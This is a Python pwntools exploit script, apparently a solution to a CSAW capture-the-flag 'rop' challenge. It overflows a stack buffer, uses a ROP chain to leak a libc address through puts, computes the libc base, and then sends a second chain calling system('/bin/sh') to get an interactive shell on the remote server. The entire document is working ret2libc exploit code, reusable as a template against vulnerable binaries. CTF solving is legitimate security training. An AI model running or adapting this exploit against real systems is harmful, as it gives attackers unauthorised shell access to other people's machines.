from pwn import *

elf = ELF('./rop')
rop = ROP(elf)

local = False

host = 'pwn.chal.csaw.io'
port = 5016

if local:
    p = elf.process()
    libc = ELF('/usr/lib/libc.so.6')
else:
    p = remote(host, port)
    libc = ELF('./libc-2.27.so')


PUTS_PLT = elf.plt['puts']
MAIN_PLT = elf.symbols['main']

# Same as ROPgadget --binary ./rop | grep "pop rdi"
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
RET = rop.find_gadget(['ret'])[0]

OFFSET = b'A' * (0x20 + 0x8)


log.info("puts@plt: " + hex(PUTS_PLT))
log.info('main@plt: ' + hex(MAIN_PLT))
log.info("pop rdi; ret; gadget: " + hex(POP_RDI))


def get_addr(func_name):
    FUNC_GOT = elf.got[func_name]
    log.info(func_name + ' GOT @ ' + hex(FUNC_GOT))

    rop_chain = [
        POP_RDI, FUNC_GOT,
        PUTS_PLT,
        MAIN_PLT,
    ]

    rop_chain = b''.join([p64(i) for i in rop_chain])
    payload = OFFSET + rop_chain

    print(p.clean())
    print(payload)

    p.sendline(payload)

    received = p.recvline().strip()
    leak = u64(received.ljust(8, b'\x00'))
    libc.address = leak - libc.symbols[func_name]
    return hex(leak)


log.info('Leaked address: ' + get_addr('__libc_start_main'))
log.info('Libc base: ' + hex(libc.address))


BIN_SH = next(libc.search(b'/bin/sh\x00'))
SYSTEM = libc.symbols['system']
EXIT = libc.symbols['exit']


log.info('/bin/sh: ' + hex(BIN_SH))
log.info('system: ' + hex(SYSTEM))
log.info('exit: ' + hex(EXIT))


ROP_CHAIN = [
    RET,
    POP_RDI, BIN_SH,
    SYSTEM,
    EXIT,
]

ROP_CHAIN = b''.join([p64(i) for i in ROP_CHAIN])

payload = OFFSET + ROP_CHAIN

print(p.clean())
print(payload)

p.sendline(payload)

p.interactive()
